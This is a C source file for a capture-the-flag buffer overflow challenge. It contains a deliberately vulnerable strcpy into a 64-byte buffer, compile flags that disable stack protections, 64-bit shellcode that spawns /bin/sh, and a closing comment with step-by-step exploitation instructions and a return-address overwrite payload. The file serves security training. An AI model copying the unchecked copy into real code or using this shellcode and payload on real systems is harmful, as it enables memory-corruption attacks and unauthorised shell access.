/*
 * Buffer Overflow Basics - CTF Challenge
 * A simple buffer overflow to get a shell
 *
 * Compile (vulnerable version):
 * gcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c
 *
 * For 32-bit:
 * gcc -m32 -fno-stack-protector -z execstack -no-pie -o vuln32 vuln.c
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

// Shellcode to spawn /bin/sh (64-bit)
// execve("/bin/sh", NULL, NULL)
unsigned char shellcode[] =
    "\x48\x31\xf6"                  // xor rsi, rsi
    "\x48\x31\xd2"                  // xor rdx, rdx
    "\x48\x31\xc0"                  // xor rax, rax
    "\x48\xbb\x2f\x62\x69\x6e"      // mov rbx, "/bin/sh"
    "\x2f\x73\x68\x00"              //
    "\x53"                          // push rbx
    "\x48\x89\xe7"                  // mov rdi, rsp
    "\xb0\x3b"                      // mov al, 59 (execve)
    "\x0f\x05";                     // syscall

// Alternative: Flag printing function
void print_flag() {
    FILE *f = fopen("flag.txt", "r");
    if (f) {
        char flag[100];
        if (fgets(flag, sizeof(flag), f)) {
            printf("Flag: %s\n", flag);
        }
        fclose(f);
    } else {
        printf("Flag: CTF{buff3r_0v3rfl0w_sh3llc0d3_m4st3r}\n");
    }
}

// Vulnerable function
void vulnerable(char *input) {
    char buffer[64];
    printf("[*] Buffer at: %p\n", buffer);
    printf("[*] print_flag at: %p\n", print_flag);
    strcpy(buffer, input);
}

int main(int argc, char *argv[]) {
    // Disable buffering
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    printf("╔════════════════════════════════════════════════╗\n");
    printf("║       Buffer Overflow Basics Challenge         ║\n");
    printf("║                                                ║\n");
    printf("║  Method 1: Redirect to print_flag function     ║\n");
    printf("║  Method 2: Inject and execute shellcode        ║\n");
    printf("╚════════════════════════════════════════════════╝\n\n");

    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        printf("\nTry: %s AAAA\n", argv[0]);
        printf("Then: %s $(python3 -c 'print(\"A\"*100)')\n", argv[0]);
        return 1;
    }

    printf("[*] Input length: %zu bytes\n", strlen(argv[1]));
    printf("[*] Buffer size: 64 bytes\n\n");

    vulnerable(argv[1]);

    printf("\n[*] Function returned normally\n");
    return 0;
}

/*
 * EXPLOITATION GUIDE:
 *
 * Step 1: Find the offset to overwrite return address
 *         - Buffer is 64 bytes
 *         - Saved RBP is 8 bytes (64-bit) or 4 bytes (32-bit)
 *         - Total padding needed: 64 + 8 = 72 bytes
 *
 * Step 2: Find the address of print_flag or inject shellcode
 *
 * Step 3: Construct payload:
 *         [72 bytes padding][address of print_flag or shellcode]
 *
 * Example (if print_flag is at 0x401156):
 *         python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\x56\x11\x40\x00\x00\x00\x00\x00")'
 *
 * For shellcode injection:
 *         - Need to know exact buffer address
 *         - Include NOP sled for reliability
 *         - Payload: [NOP sled][shellcode][padding][buffer address]
 */
